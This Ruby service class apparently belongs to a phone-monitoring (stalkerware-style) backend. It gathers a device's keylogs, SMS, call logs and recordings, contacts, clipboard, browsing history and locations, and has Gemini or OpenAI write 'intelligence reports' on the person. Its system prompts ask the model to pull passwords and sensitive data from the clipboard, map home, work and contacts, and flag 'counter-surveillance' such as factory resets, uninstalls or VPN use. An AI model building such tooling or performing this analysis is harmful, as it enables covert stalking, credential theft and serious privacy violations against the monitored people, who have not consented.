require 'net/http'
require 'json'
require 'uri'

# AI-powered analysis service for user behavior and collected data.
# Supports Google Gemini and OpenAI GPT APIs.
class AiAnalyzer
  PROVIDERS = %w[gemini openai].freeze
  MAX_CONTEXT_CHARS = 30_000

  class << self
    def provider
      ENV.fetch('AI_PROVIDER', 'gemini')
    end

    def configured?
      case provider
      when 'gemini' then ENV['GEMINI_API_KEY'].present?
      when 'openai' then ENV['OPENAI_API_KEY'].present?
      else false
      end
    end

    # Generate comprehensive behavior report for a device over a time period
    def behavior_report(device_id, period_days: 7)
      data = collect_device_data(device_id, period_days)
      return { error: 'No data found for device' } if data.values.all?(&:blank?)

      prompt = "Generate a comprehensive behavior report for device #{device_id} over the last #{period_days} days.\n" \
               "Analyze ALL provided data and identify patterns, risks, and notable activity.\n\n" \
               "COLLECTED DATA:\n#{truncate_data(data.to_json)}"
      response = ai_request(prompt, system: behavior_system_prompt)
      {
        device_id: device_id,
        period_days: period_days,
        generated_at: Time.current.iso8601,
        report: response,
        data_summary: data_summary(data)
      }
    end

    # Analyze specific data type in detail
    def analyze_data(device_id, data_type, period_days: 7)
      data = case data_type.to_s
             when 'keylogs' then fetch_keylogs(device_id, period_days)
             when 'locations' then fetch_locations(device_id, period_days)
             when 'sms' then fetch_sms(device_id, period_days)
             when 'calls' then fetch_calls(device_id, period_days)
             when 'apps' then fetch_app_usage(device_id)
             when 'clipboard' then fetch_clipboard(device_id)
             when 'browser' then fetch_browser(device_id)
             when 'contacts' then fetch_contacts(device_id)
             else return { error: "Unknown data type: #{data_type}" }
             end

      return { error: "No #{data_type} data found" } if data.blank?

      prompt = "Analyze the following #{data_type} data from device #{device_id} (last #{period_days} days).\n" \
               "Provide insights, patterns, anomalies, and a risk assessment.\n\n" \
               "DATA:\n#{truncate_data(data.to_json)}"

      response = ai_request(prompt, system: analysis_system_prompt)
      { device_id: device_id, data_type: data_type, analysis: response, record_count: data.size }
    end

    # Daily summary — quick overview of all device activity
    def daily_summary(device_id)
      data = collect_device_data(device_id, 1)
      prompt = "Generate a brief daily summary for device #{device_id}.\n" \
               "Focus on: key activities, notable events, new contacts/numbers, visited locations, app usage patterns.\n\n" \
               "TODAY'S DATA:\n#{truncate_data(data.to_json)}"

      ai_request(prompt, system: "You are a concise intelligence analyst. Provide a brief daily summary in bullet points. Use emojis for categories. Keep it under 500 words.")
    end

    # Anomaly detection — find unusual patterns
    def detect_anomalies(device_id, period_days: 30)
      data = collect_device_data(device_id, period_days)
      prompt = "Analyze data from device #{device_id} over #{period_days} days.\n" \
               "FIND ANOMALIES: unusual locations, odd hours of activity, new unknown contacts, " \
               "suspicious app usage, changed behavior patterns, keyword alerts.\n" \
               "Rate each anomaly: LOW / MEDIUM / HIGH / CRITICAL.\n\n" \
               "DATA:\n#{truncate_data(data.to_json)}"

      ai_request(prompt, system: anomaly_system_prompt)
    end

    private

    def collect_device_data(device_id, period_days)
      {
        keylogs: fetch_keylogs(device_id, period_days),
        locations: fetch_locations(device_id, period_days),
        sms_messages: fetch_sms(device_id, period_days),
        call_logs: fetch_calls(device_id, period_days),
        contacts: fetch_contacts(device_id),
        app_usage: fetch_app_usage(device_id),
        clipboard: fetch_clipboard(device_id),
        browser_history: fetch_browser(device_id),
        recordings: fetch_recordings(device_id, period_days)
      }
    end

    def fetch_keylogs(device_id, period_days)
      cache = Rails.cache.read("keylogs:#{device_id}")
      return [] unless cache.is_a?(Array)
      cutoff = period_days.days.ago
      cache.select { |k| Time.parse(k[:timestamp].to_s) >= cutoff rescue true }.first(200)
    end

    def fetch_locations(device_id, period_days)
      smartphone = find_smartphone(device_id)
      return [] unless smartphone
      smartphone.geo_locations.where('created_at >= ?', period_days.days.ago).limit(500).map do |loc|
        { lat: loc.latitude, lng: loc.longitude, time: loc.created_at.iso8601 }
      end
    end

    def fetch_sms(device_id, period_days)
      smartphone = find_smartphone(device_id)
      return [] unless smartphone
      smartphone.sms_messages.where('created_at >= ?', period_days.days.ago).limit(200).map do |sms|
        { filename: sms.filename, date: sms.date, time: sms.created_at.iso8601 }
      end
    rescue => e
      Rails.logger.warn("[AiAnalyzer] SMS fetch error: #{e.message}")
      []
    end

    def fetch_calls(device_id, period_days)
      smartphone = find_smartphone(device_id)
      return [] unless smartphone
      smartphone.call_logs.where('created_at >= ?', period_days.days.ago).limit(200).map do |call|
        { filename: call.filename, date: call.date, time: call.created_at.iso8601 }
      end
    rescue => e
      Rails.logger.warn("[AiAnalyzer] Calls fetch error: #{e.message}")
      []
    end

    def fetch_contacts(device_id)
      smartphone = find_smartphone(device_id)
      return [] unless smartphone
      smartphone.contacts.limit(100).map { |c| { filename: c.filename, date: c.date } }
    rescue => e
      []
    end

    def fetch_app_usage(device_id)
      cache = Rails.cache.read("app_usage:#{device_id}")
      cache.is_a?(Hash) ? cache : {}
    end

    def fetch_clipboard(device_id)
      cache = Rails.cache.read("clipboard:#{device_id}")
      cache.is_a?(Array) ? cache.first(50) : []
    end

    def fetch_browser(device_id)
      cache = Rails.cache.read("browser_history:#{device_id}")
      cache.is_a?(Hash) ? cache : {}
    end

    def fetch_recordings(device_id, period_days)
      smartphone = find_smartphone(device_id)
      return [] unless smartphone
      smartphone.recordings.where('created_at >= ?', period_days.days.ago).limit(50).map do |rec|
        { type: rec.recording_type, call_number: rec.call_number, direction: rec.call_direction,
          duration: rec.duration, time: rec.created_at.iso8601 }
      end
    rescue => e
      []
    end

    def find_smartphone(device_id)
      Smartphone.find_by(id: device_id) || Smartphone.find_by(name: device_id)
    end

    def data_summary(data)
      data.transform_values { |v| v.is_a?(Array) ? v.size : (v.present? ? 1 : 0) }
    end

    def truncate_data(json_str)
      json_str.length > MAX_CONTEXT_CHARS ? json_str[0..MAX_CONTEXT_CHARS] + "\n[...TRUNCATED...]" : json_str
    end

    # --- AI API calls ---

    def ai_request(prompt, system: nil)
      return { error: 'AI not configured. Set AI_PROVIDER and API key in .env' } unless configured?

      case provider
      when 'gemini' then gemini_request(prompt, system)
      when 'openai' then openai_request(prompt, system)
      else { error: "Unknown AI provider: #{provider}" }
      end
    rescue StandardError => e
      Rails.logger.error("[AiAnalyzer] AI request failed: #{e.message}")
      { error: "AI request failed: #{e.message}" }
    end

    def gemini_request(prompt, system)
      api_key = ENV['GEMINI_API_KEY']
      uri = URI("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=#{api_key}")

      contents = []
      if system.present?
        contents << { role: 'user', parts: [{ text: "SYSTEM INSTRUCTIONS: #{system}" }] }
        contents << { role: 'model', parts: [{ text: 'Understood. I will follow these instructions.' }] }
      end
      contents << { role: 'user', parts: [{ text: prompt }] }

      body = {
        contents: contents,
        generationConfig: {
          temperature: 0.3,
          maxOutputTokens: 4096
        }
      }.to_json

      response = http_post(uri, body, { 'Content-Type' => 'application/json' })
      parsed = JSON.parse(response.body)

      if parsed['candidates']&.first
        parsed['candidates'].first.dig('content', 'parts', 0, 'text') || 'No response generated'
      else
        { error: parsed['error']&.dig('message') || 'Empty AI response' }
      end
    end

    def openai_request(prompt, system)
      api_key = ENV['OPENAI_API_KEY']
      uri = URI('https://api.openai.com/v1/chat/completions')

      messages = []
      messages << { role: 'system', content: system } if system.present?
      messages << { role: 'user', content: prompt }

      body = {
        model: 'gpt-4o-mini',
        messages: messages,
        temperature: 0.3,
        max_tokens: 4096
      }.to_json

      headers = {
        'Content-Type' => 'application/json',
        'Authorization' => "Bearer #{api_key}"
      }

      response = http_post(uri, body, headers)
      parsed = JSON.parse(response.body)

      if parsed['choices']&.first
        parsed['choices'].first.dig('message', 'content') || 'No response generated'
      else
        { error: parsed['error']&.dig('message') || 'Empty AI response' }
      end
    end

    def http_post(uri, body, headers)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == 'https')
      http.open_timeout = 10
      http.read_timeout = 60

      request = Net::HTTP::Post.new(uri)
      headers.each { |k, v| request[k] = v }
      request.body = body

      http.request(request)
    end

    # --- System prompts ---

    def behavior_system_prompt
      <<~PROMPT
        You are an expert intelligence analyst for a device monitoring system.
        Analyze ALL provided data and generate a comprehensive behavior report.
        
        Structure your report:
        1. 📊 OVERVIEW — Device activity level, online hours, general behavior
        2. 📍 MOVEMENT PATTERNS — Locations visited, home/work detection, travel patterns
        3. 💬 COMMUNICATION — Who they talk to most, SMS patterns, call frequency
        4. 📱 APP USAGE — Most used apps, social media patterns, productivity vs leisure
        5. ⌨️ TYPING PATTERNS — Keywords of interest, search queries, typed messages
        6. 📋 CLIPBOARD — What they copy/paste, passwords, sensitive data
        7. 🌐 BROWSING — Sites visited, search history, interests
        8. ⚠️ RISK ASSESSMENT — Suspicious activity, security concerns, behavioral changes
        9. 📈 TRENDS — Compared to previous periods if data available
        
        Be specific with times, names, numbers. Use emojis for readability.
        Write in a professional intelligence report style.
      PROMPT
    end

    def analysis_system_prompt
      <<~PROMPT
        You are a data analyst specializing in mobile device forensics.
        Provide detailed analysis with specific data points, timestamps, and patterns.
        Highlight anything unusual or noteworthy.
        Rate findings by importance: 🔴 Critical, 🟡 Notable, 🟢 Normal.
      PROMPT
    end

    def anomaly_system_prompt
      <<~PROMPT
        You are a security analyst detecting anomalies in device monitoring data.
        Look for:
        - Unusual locations or movement at odd hours
        - New/unknown phone numbers or contacts
        - Suspicious keywords in keylogs or clipboard
        - Changed app usage patterns
        - Signs of counter-surveillance (factory reset, app uninstalls, VPN usage)
        - Financial transactions or sensitive data
        
        For each anomaly provide:
        - Description
        - Severity: 🔴 CRITICAL / 🟡 HIGH / 🟠 MEDIUM / 🟢 LOW
        - Timestamp
        - Recommendation
      PROMPT
    end
  end
end
